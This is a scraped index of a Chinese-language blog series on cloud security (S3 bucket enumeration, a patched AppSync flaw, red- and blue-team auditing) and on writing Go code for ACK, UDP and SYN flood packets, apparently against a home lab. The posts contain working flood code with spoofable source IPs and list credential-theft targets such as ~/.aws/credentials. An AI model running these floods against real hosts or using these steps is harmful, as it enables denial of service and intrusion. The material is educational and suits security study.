exist\u0026lt;/Message\u0026gt; \u0026lt;BucketName\u0026gt;XXX\u0026lt;/BucketName\u0026gt; \u0026lt;RequestId\u0026gt;XXXXXXXXXXXXX\u0026lt;/RequestId\u0026gt; \u0026lt;HostId\u0026gt;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=\u0026lt;/HostId\u0026gt; \u0026lt;/Error\u0026gt; 依照Response的不同，依據字典檔進行S3 bucket爆破，爆破S3 bucket後，爆破key也就更可行了。\n","date":"2023-09-26T00:00:00Z","permalink":"http://localhost:1313/p/day-13-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-s3-bucket-enumeration/","title":"[Day 13] 天堂雲端 - S3 Bucket Enumeration"},{"content":"ACK Flood ACK(Acknowledgement) Flood指的是攻擊者大量發送ACK封包，目標主機需要消耗資源在已建立的連接列表中查找與這些偽造的ACK封包對應的TCP連接。由於這些連接並不存在，導致目標主機花費大量的資源在處理這些無效的封包。\n目標：主要針對防火牆，ACK Flood攻擊主要針對那些維護與追蹤TCP連接的狀態的機器。\nsysAck.go 先用gopacket\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package packet import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) func Ack(targetIP string, targetPort int) error { random := rand.New(rand.NewSource(time.Now().UnixNano())) srcIP := net.ParseIP(\u0026#34;0.0.0.0\u0026#34;).To4() srcPort := random.Intn(65535) dstIP := net.ParseIP(targetIP).To4() dstPort := targetPort // Open up a packet handle for packet writes. handle, err := pcap.OpenLive(\u0026#34;bridge100\u0026#34;, 1024, false, pcap.BlockForever) if err != nil { return fmt.Errorf(\u0026#34;Failed to open device: %v\u0026#34;, err) } defer handle.Close() // Ethernet layer eth := \u0026amp;layers.Ethernet{ SrcMAC: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, DstMAC: net.HardwareAddr{0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, EthernetType: layers.EthernetTypeIPv4, } // IP layer ip := \u0026amp;layers.IPv4{ SrcIP: srcIP, DstIP: dstIP, Version: 4, TTL: 64, Protocol: layers.IPProtocolTCP, } // TCP layer tcp := \u0026amp;layers.TCP{ SrcPort: layers.TCPPort(srcPort), DstPort: layers.TCPPort(dstPort), ACK: true, Seq: uint32(rand.Int31()), Ack: uint32(rand.Int31()), Window: 14600, } tcp.SetNetworkLayerForChecksum(ip) // Serialize the packet buf := gopacket.NewSerializeBuffer() opts := gopacket.SerializeOptions{ ComputeChecksums: true, FixLengths: true, } err = gopacket.SerializeLayers(buf, opts, eth, ip, tcp) if err != nil { return fmt.Errorf(\u0026#34;Failed to serialize packet: %v\u0026#34;, err) } // Send the packet err = handle.WritePacketData(buf.Bytes()) if err != nil { return fmt.Errorf(\u0026#34;Failed to write packet: %v\u0026#34;, err) } return nil } ","date":"2023-09-26T00:00:00Z","permalink":"http://localhost:1313/p/day-13-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%AB%E5%B0%81%E5%8C%85-ack-flood%E4%B9%8B%E5%BB%BA%E7%AB%8B%E5%B0%81%E5%8C%85/","title":"[Day 13] 閑的沒事就寫封包 - ACK Flood之建立封包"},{"content":"AWS S3 是什麼？\nAWS Simple Storage Service (S3)是一個object storage service，主要用於在雲端環境中的存儲與任何數量的數據檢索。高可用性、高耐久性、及整合AWS生態系統使得此項服務廣為人知。\n也就是說，文件、圖檔、靜態庫（javascript庫等）、用戶上傳內容、靜態網站、資料庫資料、日誌、映像檔都可以放在S3裡面，而S3也提供災難復原及備份還原等功能。\n所以為什麼會設定公開權限？ AWS S3在建立一個新的S3 bucket的時候，AWS都會提醒使用者，盡量不要使用公開存取權限 \u0026lt;- 新建bucket的時候，會有AWS的友善提醒\n但為什麼還是很多人會打開公開存取權限呢？\n架設靜態網站 S3有提供架設靜態網站的功能，只要上傳HTML靜態檔到S3，就可以架設靜態網站。 不過也需要將S3設定成公開讀取權限，畢竟HTML靜態檔要設定成公眾都可以讀取，不然客戶端要怎麼讀取到HTML檔案的內容呢。 一但將S3設定成公開讀取權限，就要小心有沒有上傳不該上傳的檔案，例如.git、.env、config.yaml等。\n如果沒有公開存取權限 設定S3，在這個S3 bucket上傳一個靜態檔案，並設定靜態檔案託管，會得到一個這個靜態檔案的URI跟URL，URL格式通常是這樣的：https://{YOUR_S3_BUCKET_NAME}.s3.amazonaws.com/{FILE_NAME}.html 連接此URL，如果沒有公開權限，會得到以下錯誤訊息\n1 2 3 4 5 6 \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;AccessDenied\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;Access Denied\u0026lt;/Message\u0026gt; \u0026lt;RequestId\u0026gt;XXXXXXXXXXXX\u0026lt;/RequestId\u0026gt; \u0026lt;HostId\u0026gt;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX=\u0026lt;/HostId\u0026gt; \u0026lt;/Error\u0026gt; 為了使公眾能觀看靜態檔案內容，只好打開公開存取權限 打開了就可以正常訪問這個放在S3的靜態檔案了。\n日誌、備份檔、映像檔、靜態庫 S3一個常見的用途，就是存放一些主機日誌、應用程式備份檔、部署容器的映像檔、程式語言靜態庫等，因為S3高耐久性與高可用性很適合長期存放一些檔案內容。但由於為了一時方便，很多時候讀取靜態庫跟映像檔會設定成公開存取權限 ；傳送日誌及備份檔的時候也會因為方便，將bucket設定成公開讀取好方便傳送。這就會造成潛在的洩漏風險。\n臨時修改 開發團隊常常遇到一種情境，上午開會說緊急支援，下午就得上production環境，這種時候當天都快過不下去了就會發生兩個潛在的風險：\n權限配置錯誤 - 不管了全開再說 開發環境變成正式環境 - 不管了先上再說 以上兩種，我都親身體驗過，都快爆炸了還管什麼安不安全。但事後並不會回去補\u0026hellip;\n隱晦式安全（Security through obscurity） 大家都看不見所以很安全\nSecurity through obscurity指的就是攻擊者猜不到目標URL，所以使用者相信，就算S3設定是公開存取也很安全。\n實際上是，攻擊者也猜不到subdomain呢，但其實爆破subdomain的工具有很多；同理，S3 bucket name跟gmail還有domain name一樣是有唯一性的，所以並不會發生兩個名字一樣的bucket衝突到的情況，而因為這樣使用者以為別人不會知道我的s3 bucket名稱是什麼，所以就理所當然的開啟公開權限。但現在攻擊者會盡可能地猜出名稱，包含常見的字串型態或是使用AI工具猜測常見的名稱（就跟猜密碼一樣）。所以說S3 bucket還是很有可能被爆破的，就連Github上面有很多專門暴力搜尋S3 bucket名稱的工具。\n","date":"2023-09-25T00:00:00Z","permalink":"http://localhost:1313/p/day-12-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-s3%E4%B9%8B%E7%82%BA%E4%BB%80%E9%BA%BC%E8%A6%81%E6%89%93%E9%96%8B%E5%85%AC%E6%9C%89%E5%AD%98%E5%8F%96%E6%AC%8A/","title":"[Day 12] 天堂雲端 - S3之為什麼要打開公有存取權？"},{"content":"UDP Flood udp(User Datagram Protocol)是一種非連線型的傳輸協定，意思是說，udp協定只要把封包丟出去就好了，不需要像tcp一樣還要確認連線。攻擊者產生任意PORT的udp封包傳送到伺服器，目標主機收到udp封包後，先判斷有沒有應用程式正在監聽這個PORT，如果沒有就回傳一個ICMP封包回覆此目的地無法到達。意思是說，只要此PORT沒有被應用程式監聽，目標主機收到一個udp封包就會回傳一個ICMP封包。 如何應對UDP Flood攻擊 由防火牆區別並丟掉無意義的udp封包 限制單一來源的udp封包數量，如果超過某個閥值，直接丟到udp封包 只允許特定或信任的端口接收udp封包。 作業系統限制對ICMP封包回應率 IDS/IPS異常監測 加裝DDOS防禦設備等 sysUdp.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // @Title sysUdp.go // @Description Build a udp packet with sys/unix // @Author Sunny Tsai // @Update 2023-09-25 package packet import ( \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) // @title Udp // @description Build a SYN packet with sys/unix // @auth Sunny Tsai Time(2023/09/25) // @param targetIP string send to target ip address // @param targetPort int send to target port // @return error error func Udp(targetIP string, targetPort int) error { random := rand.New(rand.NewSource(time.Now().UnixNano())) srcIP := \u0026#34;0.0.0.0\u0026#34; srcPort := random.Intn(65535) // build socket fd, err := unix.Socket(unix.AF_INET, unix.SOCK_DGRAM, 0) if err != nil { log.Fatal(err) } defer unix.Close(fd) localAddr := \u0026amp;unix.SockaddrInet4{Port: srcPort} copy(localAddr.Addr[:], net.ParseIP(srcIP).To4()) err = unix.Bind(fd, localAddr) if err != nil { log.Fatal(err) } // set message message := []byte(\u0026#34;Hello, UDP!\u0026#34;) # Payload通常是隨機的或沒有意義的，因為目的不是要傳遞有用的信息，而是要消耗目標服務器的資源。 sendTo(targetIP, targetPort, fd, message) return nil } // @title sendTo // @description Send udp packet to target // @auth Sunny Tsai Time(2023/09/24) // @param targetIP string send to target ip address // @param targetPort int send to target port // @param fd int socket fd // @param message []byte message func sendTo(targetIP string, targetPort int, fd int, message []byte) { remoteAddr := \u0026amp;unix.SockaddrInet4{Port: targetPort} copy(remoteAddr.Addr[:], net.ParseIP(targetIP).To4()) _ = unix.Sendto(fd, message, 0, remoteAddr) } ","date":"2023-09-25T00:00:00Z","permalink":"http://localhost:1313/p/day-12-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%AB%E5%B0%81%E5%8C%85-udp-flood%E4%B9%8B%E5%BB%BA%E7%AB%8B%E5%B0%81%E5%8C%85/","title":"[Day 12] 閑的沒事就寫封包 - UDP Flood之建立封包"},{"content":"\nAWS AppSync AppSync是一個Serverless服務，可建立GraphQL或是Pub/Sub API，後端資料來源可以為多個來源合併成一個。\n同場加映 - Pub/Sub API Pub/Sub (Publish-Subscribe)是一種消息傳送的模式，由發布者(Publish)發送消息，訂閱者(Subscribe)接收消息。發布者(Publish)將消息發送到通道(channel)中，訂閱者(Subscribe)訂閱通道(Channel)。訂閱者(Subscribe)可以同時訂閱多個通道(Channel)。Pub/Sub模式可以實現各種分布式系統及應用。\n同場加映 - GraphQL 目前API查詢分3種：RESTful API, GraphQL API, GRPC\nGraphQL是由FB開發的API查詢語言，提供一種更靈活高效的方式請求或操作數據，解決傳統RESTful API中的查詢問題。 GraphQL可以精準的取得數據，避免了RESTful API提取整個資源的問題，同時也避免地對於資料庫過度IO的問題。\nAWS AppSync未經授權訪問 混淆代理人(confused deputy) 一個權限較低的（如攻擊者）使用權限較高的（如AppSync）執行行為\n實例 以儲存庫為S3為例，使用者使用AppSync建立GraphQL API。當GraphQL API被呼叫時，由AppSync執行AWS API呼叫並執行結果。 原本AWS會驗證Amazon Resource Name (ARN)防止AppSync濫用行為，ARN是AWS的獨立辨識代碼。在執行命令時，AppSync建立的GraphQL API 下的serviceRoleArn會包含此帳號的ARN。AppSync會檢查呼叫的ARN是不是同一個AWS帳號，若不是同一個帳號，AppSync會拋出錯誤代碼。 而API的serviceRoleArn參數如果以不同大小寫組合，例如servicerolearn，就能繞過驗證。使不同帳號的人可以建立API到其他AWS帳號的AppSync資料源。意思是說，只要攻擊者能取得目標底下任一角色，最後都可以取得目標公司資源的控制權。\n註：Datadog在2022年9月1日通報AWS後，9月6日AWS已修補了AppSync服務的漏洞\n碎碎念 AppSync是一個很好的0day漏洞實例，未經授權的漏洞不管是在地端還是在雲端都很常見。而且他已經被修補好了，不能測了。\n","date":"2023-09-24T00:00:00Z","permalink":"http://localhost:1313/p/day-11-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E6%9B%BE%E7%B6%93%E7%9A%840day-appsync/","title":"[Day 11] 天堂雲端 - 曾經的0day AppSync"},{"content":"SYN Flood 盡其所能的丟SYN封包，消耗目標伺服器所有可用的資源。使TCP三方交握無法正常工作，使標的無法回應或緩慢回應合法流量。\nTCP三方交握（Three Way Handshake） client向Server發送SYN封包，請求連線。 Server向Client發送封包SYN/ACK封包，確認通訊中。 Client向Server發送ACK封包，建立通話。 SYN Flood 從TCP 三方交握的方式來看，一但任意地址向Server端發送SYN封包請求通話，Server端就會回傳一個SYN/ACK回應請求，並開啟一個PORT等待接收ACK封包。如此，攻擊者只要發送大量的SYN封包，Server端就會開啟一個臨時的PORT等待接收回應直到連線逾時，只要把Server端的PORT都佔用，將無法收到合法流量的封包。\n註：當有ㄧ方的機器開啟連線，但另一方的機器卻未開啟，這個連線可以視為半開放連線。所以SYN Flood也可以視為半開放式攻擊\nSYN Packet main.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;github.com/windasunny/ddos/packet\u0026#34; ) func buildSynPacket(targetIp string, targetPort int) { err := packet.Syn(targetIp, targetPort) if err != nil { fmt.Println(err) } } func main() { // SYN var wg sync.WaitGroup wg.Add(1) go func() { buildSynPacket(\u0026#34;10.211.55.10\u0026#34;, 12345) wg.Done() }() wg.Wait() } 考慮了一下，random port先不下全域鎖。 sysSyn.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 // @Title SYN.go // @Description Build a SYN packet with // @Author Sunny Tsai // @Update 2023-09-24 package packet import ( \u0026#34;fmt\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; \u0026#34;golang.org/x/sys/unix\u0026#34; ) // @title Syn // @description Build a SYN packet with sys/unix // @auth Sunny Tsai Time(2023/09/24) // @param targetIP string send to target ip address // @param targetPort int send to target port // @return error error func Syn(targetIP string, targetPort int) error { random := rand.New(rand.NewSource(time.Now().UnixNano())) srcIP := \u0026#34;0.0.0.0\u0026#34; srcPort := random.Intn(65535) // build socket fd, err := unix.Socket(unix.AF_INET, unix.SOCK_STREAM, unix.IPPROTO_TCP) if err != nil { return fmt.Errorf(\u0026#34;Failed to create socket: %v\u0026#34;, err) } defer unix.Close(fd) // set source ip and port localAddr := \u0026amp;unix.SockaddrInet4{Port: srcPort} copy(localAddr.Addr[:], net.ParseIP(srcIP).To4()) err = unix.Bind(fd, localAddr) if err != nil { return fmt.Errorf(\u0026#34;Failed to bind socket: %v\u0026#34;, err) } sendTo(targetIP, targetPort, fd) return nil } // @title sendTo // @description Send SYN packet to target // @auth Sunny Tsai Time(2023/09/24) // @param targetIP string send to target ip address // @param targetPort int send to target port // @param fd int socket fd func sendTo(targetIP string, targetPort int, fd int) { // set target ip and port, then connect remoteAddr := \u0026amp;unix.SockaddrInet4{Port: targetPort} copy(remoteAddr.Addr[:], net.ParseIP(targetIP).To4()) _ = unix.Connect(fd, remoteAddr) } ","date":"2023-09-24T00:00:00Z","permalink":"http://localhost:1313/p/day-11-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%AB%E5%B0%81%E5%8C%85-syn-flood%E4%B9%8B%E5%BB%BA%E7%AB%8B%E5%B0%81%E5%8C%85/","title":"[Day 11] 閑的沒事就寫封包 - SYN Flood之建立封包"},{"content":"雲端技術雖然帶來了便利和效能，但並非銅牆鐵壁。它不僅有潛在的硬體問題，也可能因供應商或使用者的不當操作而產生安全漏洞。\n硬體造成的漏洞（掃到颱風尾） 雲供應商使用的硬體造成的漏洞，影響到雲端服務。\nAWS CVE-2023-20569 AMD CPUs Azure CVE-2022-21123 Intel(R) Processors GCP CVE-2023-20593 Zen 2 CPUs 雲端供應商提供的服務漏洞 服務漏洞\nAWS AppSync 混淆代理人（confused deputy）：一個權限較低的（如攻擊者）使用權限較高的（如AppSync）執行行為 WorkSpaces RCE 漏洞 Azure Azure API Management、Azure Functions、Azure Machine Learning 和 Azure Digital Twins服務存有漏洞 容易受到SSRF攻擊 Power Platform 自定義程式碼竊取敏感資訊 GCP Cloud Asset Inventory 資產密鑰竊取漏洞 使用者造成的漏洞 由使用者配置不當、弱憑證弱密碼、第三方元件漏洞等造成。\n未經授權訪問 當使用者未經授權地訪問資源時，可能會產生潛在的安全風險，這通常源於不當的配置設定。 takeover 錯誤的配置容易被攻擊者接管 錯誤的配置 由於疏忽或缺乏專業知識，使用者有時會錯誤地配置安全設置，依照前幾天的文章天堂雲端 - 安全性由誰負責？，使用者必須負責相應區塊的安全性。 ","date":"2023-09-23T00:00:00Z","permalink":"http://localhost:1313/p/day-10-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E9%9B%B2%E7%AB%AF%E6%9B%BE%E7%B6%93%E5%87%BA%E7%8F%BE%E9%81%8E%E7%9A%84%E6%BC%8F%E6%B4%9E/","title":"[Day 10] 天堂雲端 - 雲端曾經出現過的漏洞"},{"content":"什麼是benchmark 基準測試(benchmark)是一種程式碼的測試方法，在特定時間或特定操作下或功能在一定條件下的測試速度，通常以次數與時間做基本。\nBenchmark 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package main import ( \u0026#34;runtime\u0026#34; \u0026#34;testing\u0026#34; \u0026#34;github.com/windasunny/ddos/packet\u0026#34; ) // Benchmark for the first udp code (using gopacket) func BenchmarkGopacket(b *testing.B) { b.ReportAllocs() for i := 0; i \u0026lt; b.N; i++ { packet.Udp() } var memStats runtime.MemStats runtime.ReadMemStats(\u0026amp;memStats) } // Benchmark for the second udp code (using unix) func BenchmarkUnixUDP(b *testing.B) { b.ReportAllocs() for i := 0; i \u0026lt; b.N; i++ { packet.SysUdp() } var memStats runtime.MemStats runtime.ReadMemStats(\u0026amp;memStats) } 輸出 1 2 3 4 # functest Number of iterations Runtime/Iteration Memory/Iteration Memory allocations/Iteration BenchmarkGopacket-8 7158 167018 ns/op 28496 B/op 279 allocs/op BenchmarkUnixUDP-8 15555 150377 ns/op 96 B/op 4 allocs/op PASS 結論 unix-udp顯然比gopacket-udp內存消耗更低、執行時間更快。接下來封包都會用unix建立封包。\n","date":"2023-09-23T00:00:00Z","permalink":"http://localhost:1313/p/day-10-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%ABbenchmark/","title":"[Day 10] 閑的沒事就寫benchmark"},{"content":"紅隊視角-審核雲端環境 辨識雲端 為了快速辨識雲端環境，需要辨識以下內容：\n服務識別 首先，先確定這個雲端環境會有哪些正在運作的服務，不同的服務會有不同的風險與攻擊面。\n外部暴露 哪些端口和服務暴露在外部網路，評估存在的攻擊面。包括任何開放的端口、應用程式及任何可能的弱點。\n訪問權限 包括IAM的配置、用戶角色及身份驗證及授權相關的策略。\n內外網連接 探查內部雲端服務是否與外部服務有連接，這些連接可能形成攻擊通道。\n破壞雲端環境 以AWS為例， 破壞AWS環境的第一步是嘗試獲取一些憑證\nOSINT 收集所以來自公開可用的訊息\nGithub/Gitlab （或類似）洩漏的credential 尋找在版本控制中不慎洩漏的憑證，這些憑證可能包含對AWS資源的訪問權限。\n社交工程 通過欺騙、誘導等方式，針對目標人員試圖獲得敏感資訊。\n密碼重複使用／密碼洩漏 利用被多次使用的密碼或曾經在其他平台上洩漏的密碼，來嘗試登錄AWS賬戶。\nAWS 託管服務中的漏洞 尋找AWS託管服務中已知或未公開的漏洞，以獲得未授權的訪問權限。\n本地文件讀取 搜尋受感染的主機，例如AWS憑證存取位置，來竊取憑證。 * /home/USERNAME/.aws/credentials * C:\\Users\\USERNAME\\.aws\\credentials 第三方洩漏 尋找第三方服務或供應商的洩漏，這些洩漏可能包含AWS憑證。 內部員工洩漏 通過社交工程或其他方式誘導內部員工泄漏憑證或訪問信息。 Cognito 憑證 如果目標使用Amazon Cognito進行身份驗證和授權，攻擊者可能會針對Cognito憑證進行攻擊。 ","date":"2023-09-22T00:00:00Z","permalink":"http://localhost:1313/p/day-9-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E5%AF%A9%E6%A0%B8%E9%9B%B2%E7%AB%AF%E7%92%B0%E5%A2%83%E7%B4%85%E9%9A%8A/","title":"[Day 9] 天堂雲端 - 審核雲端環境（紅隊）"},{"content":"建立封包 UDP封包\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 package main import ( \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) func main() { var ( device string = \u0026#34;bridge100\u0026#34; snapshotLen int32 = 1024 promiscuous bool = false err error timeout time.Duration = 10 * time.Second handle *pcap.Handle buffer gopacket.SerializeBuffer random *rand.Rand ) handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout) if err != nil { log.Fatal(err) } defer handle.Close() random = rand.New(rand.NewSource(time.Now().UnixNano())) srcPort := layers.UDPPort(random.Intn(65535)) dstPort := layers.UDPPort(12345) ethernetLayer := \u0026amp;layers.Ethernet{ SrcMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, DstMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, EthernetType: layers.EthernetTypeIPv4, } ipLayer := \u0026amp;layers.IPv4{ SrcIP: net.IP{10, 211, 55, 2}, DstIP: net.IP{10, 211, 55, 10}, Version: 4, TTL: 64, Protocol: layers.IPProtocolUDP, } udpLayer := \u0026amp;layers.UDP{ SrcPort: srcPort, DstPort: dstPort, } udpLayer.SetNetworkLayerForChecksum(ipLayer) payload := []byte(\u0026#34;Hello World\u0026#34;) buffer = gopacket.NewSerializeBuffer() opts := gopacket.SerializeOptions{ FixLengths: true, ComputeChecksums: true, } if err := gopacket.SerializeLayers(buffer, opts, ethernetLayer, ipLayer, udpLayer, gopacket.Payload(payload)); err != nil { log.Fatal(err) } udpPacket := buffer.Bytes() err = handle.WritePacketData(udpPacket) if err != nil { log.Fatal(err) } } 靶機攔截封包 攔截封包\n1 2 22:03:52.573287 IP (tos 0x0, ttl 64, id 0, offset 0, flags [none], proto UDP (17), length 39) 10.211.55.2.26598 \u0026gt; ubuntu-linux-20-04-desktop.12345: UDP, length 11 與net.Dial比對 使用net.Dial發送UDP封包\n1 2 3 4 5 6 7 8 9 10 func main() { targetIP := \u0026#34;10.211.55.10\u0026#34; targetPort := 12345 conn, err := net.Dial(\u0026#34;udp\u0026#34;, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, targetIP, targetPort)) if err != nil { fmt.Println(\u0026#34;Error connecting:\u0026#34;, err) return } defer conn.Close() } 攔截封包\n1 2 22:09:05.603943 IP (tos 0x0, ttl 64, id 40361, offset 0, flags [none], proto UDP (17), length 39) 10.211.55.2.63766 \u0026gt; ubuntu-linux-20-04-desktop.12345: UDP, length 11 UDP成功！\n","date":"2023-09-22T00:00:00Z","permalink":"http://localhost:1313/p/day-9-%E9%96%91%E7%9A%84%E6%B2%92%E4%BA%8B%E5%B0%B1%E5%AF%AB%E5%B0%81%E5%8C%85-gopacket%E5%BB%BA%E7%AB%8Budp%E5%B0%81%E5%8C%85/","title":"[Day 9] 閑的沒事就寫封包 - gopacket建立UDP封包"},{"content":"藍隊視角 - 一般情況下雲端環境漏洞 配置錯誤（Misconfigurations） 雲端服務提供預設配置，但不能說就完全沒有問題，錯誤的配置、開放的端口和未使用的服務都可能造成漏洞。\n弱憑證（Weak Credentials） 跟弱密碼一樣，容易被破解的憑證容易導致入侵。\n缺少加密設定（Lack of Encryption） 數據在存儲或傳輸的時候缺少加密。\n不安全的APIs（Insecure APIs） 不安全的API介面容易被攻擊者利用，導致數據洩露或是未經授權的訪問。\n未授權訪問（Unauthorized access） 攻擊者可以透過猜測、竊取，以未經授權的方式訪問雲端資源。\n內部威脅（Insider Threats） 內部員工或承包商的惡意泄露或疏忽行為可能會導致敏感數據洩露。\n未修補的漏洞（Unpatched Vulnerabilities） 雲端供應商來不及修補的漏洞，成了供應商跟攻擊者間的競賽。\n不安全的第三方套件（Insecure Third-party Integrations） 惡意或是不安全的第三方設定容易導致數據洩露或是未經授權的訪問。\n數據洩露（Data Leakage） 因為程式碼設定不當或是上述環境漏洞導致的數據洩露。\n日誌與監控不足（Insufficient logging and monitoring） 雲端服務通常都有日誌，沒有正確管理日誌與監控會導致有紀錄攻擊行為但被忽略。\n","date":"2023-09-21T00:00:00Z","permalink":"http://localhost:1313/p/day-8-%E5%A4%A9%E5%A0%82%E9%9B%B2%E7%AB%AF-%E5%AF%A9%E6%A0%B8%E9%9B%B2%E7%AB%AF%E7%92%B0%E5%A2%83%E8%97%8D%E9%9A%8A/","title":"[Day 8] 天堂雲端 - 審核雲端環境（藍隊）"},{"content":"以下是一個簡單的建立單純的TCP SYN封包示例\nGopacket建立封包 按照文件，code應該要這樣寫\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 package main import ( \u0026#34;log\u0026#34; \u0026#34;net\u0026#34; \u0026#34;time\u0026#34; \u0026#34;github.com/google/gopacket\u0026#34; \u0026#34;github.com/google/gopacket/layers\u0026#34; \u0026#34;github.com/google/gopacket/pcap\u0026#34; ) func main() { var ( device string = \u0026#34;bridge100\u0026#34; // 換了一張網卡 snapshotLen int32 = 1024 promiscuous bool = false err error timeout time.Duration = 10 * time.Second handle *pcap.Handle buffer gopacket.SerializeBuffer ) var SerializationOptions = gopacket.SerializeOptions{ FixLengths: true, ComputeChecksums: true, } // Open device handle, err = pcap.OpenLive(device, snapshotLen, promiscuous, timeout) if err != nil { log.Fatal(err) } defer handle.Close() // SrcMAC跟DstMAC兩個可以不用按照真實案例 ethernetLayer := \u0026amp;layers.Ethernet{ SrcMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, DstMAC: net.HardwareAddr{0xFF, 0x00, 0xFF, 0x00, 0xFF, 0x00}, EthernetType: layers.EthernetTypeIPv4, } ipLayer := \u0026amp;layers.IPv4{ SrcIP: net.IP{10, 211, 55, 2}, //source ip DstIP: net.IP{10, 211, 55, 10}, Version: 4, TTL: 64, Protocol: layers.IPProtocolTCP, } tcpLayer := \u0026amp;layers.TCP{ SrcPort: layers.TCPPort(12345), DstPort: layers.TCPPort(12345), SYN: true, ACK: true, } tcpLayer.SetNetworkLayerForChecksum(ipLayer) // And create the packet with the layers buffer = gopacket.NewSerializeBuffer() gopacket.SerializeLayers(buffer, SerializationOptions, ethernetLayer, ipLayer, tcpLayer, ) // Send serialize packet outgoingPacket := buffer.Bytes() err = handle.WritePacketData(outgoingPacket) if err != nil { log.Fatal(err) } } 同樣在靶機上攔截封包：\n1 2 3 # 靶機上收到Flag為S(SYN)封包 02:48:47.273581 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 64) 10.37.129.2.12347 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [S], cksum 0xd356 (correct), seq 7459, win 65535, options [mss 1460,wscale 6,sackOK,nop,nop,TS val 16909060 ecr 84281096,eol], length 0 沒錯只有這樣，正常的SYN封包是會讓靶機回傳ACK/SYN封包做三次握手的第二步驗證的，但沒有，說明這是異常封包。\n驚喜點 可以在Network Layer層修改任意SrcIP\n1 2 3 4 5 6 7 ipLayer := \u0026amp;layers.IPv4{ SrcIP: net.IP{10, 211, 55, 3}, // \u0026lt;- 這邊改成任意IP，就算是網段下沒有配置的IP也可以 DstIP: net.IP{10, 211, 55, 10}, Version: 4, TTL: 64, Protocol: layers.IPProtocolTCP, } 然後可以發送。\n使用net.Dial發送封包 1 2 3 4 5 6 7 8 9 10 func main() { targetIP := \u0026#34;10.211.55.10\u0026#34; targetPort := 12345 tcpConn, err := net.Dial(\u0026#34;tcp\u0026#34;, fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, targetIP, targetPort)) if err != nil { log.Fatalf(\u0026#34;Failed to connect：%v\u0026#34;, err) } defer tcpConn.Close() } 攔截封包 看起來是很正常的TCP三次握手\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 02:55:36.431738 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52) 10.211.55.2.52261 \u0026gt; ubuntu-linux-20-04-desktop.12345: Flags [.], cksum 0x4fe0 (correct), ack 1, win 2058, options [nop,nop,TS val 2224605755 ecr 3013823431], length 0 02:55:36.432070 IP (tos 0x2,ECT(0), ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 72) 